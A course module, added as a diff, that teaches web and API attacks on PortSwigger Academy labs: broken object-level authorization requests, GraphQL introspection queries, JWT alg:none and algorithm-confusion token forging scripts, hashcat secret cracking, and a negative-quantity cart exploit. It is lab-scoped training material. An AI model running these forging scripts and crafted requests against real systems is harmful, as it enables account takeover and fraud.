@@ -1,0 +1,205 @@
+---
+trackId: cybersecurity-ethical-hacking
+tier: 3
+title: "Advanced Web & API Security"
+order: 4
+estimatedHours: 20
+slug: advanced-web-and-api-security
+---
+
+## Scope: what "advanced" means here
+
+PortSwigger doesn't label labs "advanced" — it labels them **APPRENTICE**, **PRACTITIONER**, or **EXPERT**, shown as a colored difficulty dot next to the lab title on [portswigger.net/web-security/all-labs](https://portswigger.net/web-security/all-labs). This module lives mostly in PRACTITIONER and EXPERT territory. Every attack below is run against either a PortSwigger Academy hosted lab, or your own Juice Shop / DVWA / Metasploitable2 instance from earlier tiers. Nothing here targets a live site, a hypothetical company, or anything you don't have explicit, lab-scoped authorization to touch.
+
+## Starting an EXPERT lab: what actually happens
+
+Open **JWT authentication bypass via algorithm confusion with no exposed key** (GraphQL/JWT topic, EXPERT difficulty). Click **Access the lab**. PortSwigger provisions a dedicated, ephemeral container on a unique subdomain — something like `https://0a7400cd04a1f36ec0ea0db800e6008c.web-security-academy.net/` — that belongs only to your session. It is not shared with other learners, it has a solve-state tracker in the top banner, and it tears down after prolonged inactivity. Point Burp's browser (or your system proxy) at that exact host. Nothing about your approach changes versus an APPRENTICE lab — you still intercept, repeat, and tamper requests in Burp — but EXPERT labs give you less scaffolding in the lab description, so you're expected to derive the attack class from the response behavior yourself. We'll come back to this specific lab's technique in the JWT section below.
+
+## REST API authorization testing with Burp
+
+Open **Exploiting an API endpoint using documentation** (API testing topic, APPRENTICE). The app exposes a `/api/doc` Swagger/OpenAPI path that documents endpoints never linked from the UI. Pull it:
+
+```
+GET /api/doc HTTP/1.1
+Host: 0a3100e903cf3fbac0b50f00007000a8.web-security-academy.net
+```
+
+The response body lists an endpoint the shop's navigation never surfaces:
+
+```json
+{
+  "paths": {
+    "/api/user/{username}": {
+      "get": {
+        "summary": "Get user object",
+        "parameters": [{ "name": "username", "in": "path" }]
+      }
+    }
+  }
+}
+```
+
+There is no mention anywhere in the doc of which usernames you're "allowed" to query, and no role parameter on the call. That absence is the vulnerability. Log in as `wiener`, intercept any authenticated request in Burp Proxy, send it to Repeater, then change the path to target another account while keeping your own `wiener` session cookie:
+
+```
+GET /api/user/carlos HTTP/1.1
+Host: 0a3100e903cf3fbac0b50f00007000a8.web-security-academy.net
+Cookie: session=wUx9Jm2KpL8vQZbN3fR7tYhA1cD4eGxX
+```
+
+A `200 OK` with carlos's API key or email in the body means the server checked that *a* valid session exists, but never checked that *this* session owns the object being requested. This is **API1:2023 — Broken Object Level Authorization (BOLA)**: the single most common API vulnerability class, and it is structurally different from the XSS/SQLi bugs from earlier tiers because the request is syntactically perfect — the flaw is purely in the authorization check that never ran. Confirm it's a real authz gap (not just information disclosure) by also trying a `PATCH` or `DELETE` against the same path and watching whether mutating actions succeed against an object you don't own.
+
+## GraphQL introspection: finding fields the UI never shows you
+
+Open **Accidental exposure of private GraphQL fields** (GraphQL API vulnerabilities topic, APPRENTICE). Find the GraphQL endpoint first — usually `/graphql` or `/graphql/v1`, sometimes only discoverable by sending any malformed query to common paths and watching for a GraphQL-shaped error. Confirm it's live:
+
+```bash
+curl -s https://LAB-ID.web-security-academy.net/graphql/v1 \
+  -H 'Content-Type: application/json' \
+  -d '{"query":"{__typename}"}'
+```
+
+A `{"data":{"__typename":"Query"}}` response confirms a working GraphQL layer. Now run a full introspection query — this is the single most important query in GraphQL testing, because unlike REST, a GraphQL server can tell you its *entire* schema on request unless introspection has been explicitly disabled:
+
+```graphql
+query IntrospectionQuery {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type { name }
+      }
+    }
+  }
+}
+```
+
+Send it with Burp Repeater or:
+
+```bash
+curl -s https://LAB-ID.web-security-academy.net/graphql/v1 \
+  -H 'Content-Type: application/json' \
+  -d '{"query":"query{__schema{types{name fields{name}}}}"}' | jq .
+```
+
+Scan the dumped type list for fields the application's UI never renders. In this lab class, the `User` type exposes a field that the front end carefully avoids requesting — for example a `password` or `resetToken` field sitting right next to `username` and `email`. GraphQL does not care that the UI never asks for it; the resolver will happily return it to anyone who asks directly:
+
+```graphql
+query {
+  getUser(id: 1) {
+    username
+    password
+  }
+}
+```
+
+If that mutation/query path returns a plaintext or recoverable credential for another account, you've confirmed the schema leaks a field that should have required elevated authorization or should never have been queryable at all. The **InQL** Burp extension (BApp Store) automates this schema dump and generates a query template per field, which is worth running on every GraphQL target so you don't manually transcribe a 200-field schema by hand.
+
+## JWT attacks
+
+### alg:none — forging an unsigned token
+
+Open **JWT authentication bypass via unverified signature** (APPRENTICE). Log in, grab your session JWT from the cookie, and drop it into Burp's built-in JSON Web Token tab (Repeater → request → the "JSON Web Token" tab that appears automatically when Burp detects a JWT). The decoded header looks like:
+
+```json
+{ "alg": "HS256", "typ": "JWT" }
+```
+
+and the payload:
+
+```json
+{ "sub": "wiener", "exp": 1730000000 }
+```
+
+The vulnerable server trusts the `alg` field in the token itself rather than enforcing a server-side allow-list. Change `alg` to `none`, change `sub` to `administrator`, and strip the signature segment entirely — Burp's tab has a one-click "Sign" dropdown that includes exactly this option. If you're doing it by hand instead:
+
+```python
+import base64, json
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({"sub": "administrator", "exp": 9999999999}).encode())
+
+token = f"{header}.{payload}."   # trailing dot, empty signature
+print(token)
+```
+
+Set that value as your session cookie, reload `/admin`, and confirm the "Delete carlos" action is now available and executable. The root cause: the server's JWT library accepted `none` as valid because nobody pinned the expected algorithm when calling `jwt.decode()`.
+
+### Algorithm confusion — turning the public key into an HMAC secret
+
+Back in **JWT authentication bypass via algorithm confusion with no exposed key** (EXPERT, from the intro section): this server signs tokens with RS256, an asymmetric algorithm where a private key signs and the corresponding public key verifies. The bug is in verification code that does roughly `jwt.decode(token, serverKeyMaterial)` without pinning the algorithm — meaning if you send a token whose header claims `"alg": "HS256"`, the server will try to verify it as HS256 using whatever key material it has on hand, which is the RSA **public** key. Since HS256 is symmetric, "verifying" with a key is identical to "signing" with it. If you can obtain or derive the public key — from a `/jwks.json` endpoint, a TLS cert, or (in the "no exposed key" variant) by brute-forcing it — you can sign your own HS256 token using that public key as the shared secret:
+
+```python
+import jwt  # PyJWT
+
+public_key_pem = open("server_public_key.pem", "rb").read()
+
+forged = jwt.encode(
+    {"sub": "administrator", "exp": 9999999999},
+    public_key_pem,
+    algorithm="HS256",
+)
+print(forged)
+```
+
+Set the forged token as your cookie. If the server accepts it, you've proven it never pinned `alg` to RS256 server-side — a far more damaging class of bug than alg:none because it survives libraries that otherwise reject the `none` algorithm outright.
+
+### Weak HS256 secret — cracking it with hashcat
+
+Open **JWT authentication bypass via weak signing key** (PRACTITIONER). Capture your session JWT and save the full three-part string:
+
+```bash
+echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJleHAiOjE3MzAwMDAwMDB9.3hwfJKzzC0f0qV3mN8dR2sYtP1bXwLkQ' > token.txt
+```
+
+hashcat ships a dedicated JWT attack mode — `-m 16500` — that parses the header/payload/signature directly, so you don't need to convert anything first:
+
+```bash
+hashcat -m 16500 -a 0 token.txt jwt.secrets.list
+```
+
+`jwt.secrets.list` is a curated wordlist of secrets known to ship as hardcoded defaults in tutorials, frameworks, and copy-pasted boilerplate (`secret`, `your-256-bit-secret`, `jwt_secret`, etc.) — it cracks far faster here than a general password list like `rockyou.txt` because the failure mode this lab teaches isn't "humans pick bad passwords," it's "developers hardcode a placeholder secret and ship it." A hit looks like:
+
+```
+eyJhbGciOiJIUzI1NiIs...3hwfJKzzC0f0qV3mN8dR2sYtP1bXwLkQ:secret1234
+```
+
+With the secret recovered, forge an admin token the same way as before, just with HS256 and the cracked string:
+
+```python
+import jwt
+forged = jwt.encode({"sub": "administrator", "exp": 9999999999}, "secret1234", algorithm="HS256")
+```
+
+Drop it in as your cookie and confirm admin-panel access. Note the attack surface difference versus algorithm confusion: here the server did everything "right" cryptographically — it correctly only accepted HS256 — but the secret itself was guessable, which is a key-management failure, not an implementation bug.
+
+## Business logic flaws: valid input, invalid outcome
+
+Open **High-level logic vulnerability** (Business logic vulnerabilities topic, APPRENTICE). Add the cheapest item in the store (e.g., a $0.50 item) and the most expensive item (a $1337 leather jacket) to your cart. The cart update endpoint accepts a quantity parameter:
+
+```
+POST /cart HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+productId=1&quantity=-9999&redir=CART
+```
+
+A negative quantity is a perfectly well-formed integer — no injection, no malformed type, nothing a WAF or input sanitizer would ever flag. The server happily multiplies price × quantity, producing a large negative subtotal for the cheap item, which the cart then adds to the jacket's price. The displayed total drops to a value lower than your available store credit, and checkout succeeds for an item you were never supposed to afford.
+
+This is the distinction this module is building toward: **every input-validation bug from earlier tiers (SQLi, XSS, command injection, path traversal) is a bug in how the server parses or escapes a value.** A business logic flaw is a bug in what the server *allows a validly-parsed value to do*. The quantity field here needed zero malformed characters to break the application — it needed the server to never ask "should a cart line item's effective price be allowed to go negative?" You cannot find this class of bug by throwing a fuzzer's payload list at a parameter; you find it by mapping the workflow (add → price-calculate → checkout → fulfill) and asking, at each transition, "what assumption does this step make about the step before it, and can I violate that assumption while staying inside the valid data type?" Other members of this family worth recognizing by name on PortSwigger Academy: **Inconsistent security controls** (a workflow has two paths to the same state, and only one enforces a rule), **Insufficient workflow validation** (a multi-step process can be entered out of order), and **Infinite money logic flaw** (a refund/discount combination that doesn't net to zero when it should).
+
+## Exercise
+
+Work the **Exploiting a mass assignment vulnerability** lab (API testing topic, APPRENTICE) in your PortSwigger Academy account. The registration or profile-update endpoint binds the incoming JSON body directly onto a server-side object instead of allow-listing expected fields.
+
+1. Register an account and capture the registration `POST` in Burp Proxy.
+2. Pull `/api/doc` (or inspect any response that echoes back your full user object) to see what fields exist on the user object beyond the ones the registration form sends.
+3. Replay the registration/update request in Repeater with an extra JSON field added to the body that isn't on the form — something that looks like a role or privilege flag.
+4. Check whether that field actually got bound server-side by requesting your own user object back and inspecting its value.
+
+Hint: the form only submits `username`, `email`, and `password` — but the object the server returns to you after login has more fields than that. If a field exists on the object, mass-assignment bugs happen when the deserializer doesn't check whether the client was *allowed* to set it.
